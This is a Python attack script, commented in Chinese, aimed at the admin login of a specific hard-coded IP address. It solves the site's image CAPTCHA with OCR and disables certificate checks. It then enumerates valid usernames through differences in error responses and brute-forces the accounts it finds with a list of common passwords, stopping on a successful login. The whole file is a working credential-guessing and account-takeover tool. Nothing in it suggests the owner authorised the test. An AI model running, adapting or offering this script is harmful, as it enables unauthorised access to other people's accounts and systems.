#!/usr/bin/env python3
"""精确判断用户存在性 + 密码爆破"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return r.read()

def login_raw(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return "HTTP500"

def try_until_verify_ok(user, pwd, max_attempts=12):
    """重试直到验证码通过, 返回服务器真实响应"""
    for i in range(max_attempts):
        cap = get_captcha()
        code = ocr.classification(cap)
        if len(code) != 4:
            continue
        r = login_raw(user, pwd, code)
        if "验证码" not in r and "HTTP500" not in r:
            return r, code  # 真实响应
        if "HTTP500" in r:
            return "HTTP500", code  # 验证码对,用户不存在
        time.sleep(0.2)
    return "VERIFY_FAIL", None

users = ["admin","zhilian","zyadmin","kefu","yun","boss","test","customer","service",
         "zhiyuan","zhuli","zy","guanli","root","demo","user","kefu001","zy_kefu",
         "zhiliankefu","kf","kefu01","admin1","admin2","manager","operator","system"]

print("=== 用户枚举 ===", flush=True)
existing = []
for u in users:
    r, code = try_until_verify_ok(u, "x")
    if r == "HTTP500":
        print(f"[不存在] {u}", flush=True)
    elif r == "VERIFY_FAIL":
        print(f"[验证码失败] {u}", flush=True)
    else:
        print(f"### [存在?] {u}: {r[:80]}", flush=True)
        existing.append(u)

print(f"候选用户: {existing}", flush=True)

passwords = ["123456","admin123","admin","12345678","admin888","123123","admin666",
             "admin@123","123456789","password","111111","888888","a123456",
             "Aa123456","abc123","1234567890","qwerty","1qaz2wsx","admin2024",
             "admin2025","admin2026","test123","yun123","boss123"]

for user in existing:
    print(f"--- 爆破 {user} ---", flush=True)
    for pw in passwords:
        r, code = try_until_verify_ok(user, pw)
        if r == "HTTP500":
            continue  # 用户其实不存在
        if r == "VERIFY_FAIL":
            continue
        if "密码" in r or "账号" in r or "失败" in r:
            print(f"[密码错] {user}/{pw}", flush=True)
            continue
        print(f"!!! 非密码错误响应: {user}/{pw} -> {r[:100]}", flush=True)
        # 检查是否登录成功(跳转或status=1)
        if '"status":1' in r or "success" in r.lower():
            print(f"!!! 登录成功 {user}/{pw} code={code}", flush=True)
            sys.exit(0)
print("DONE")
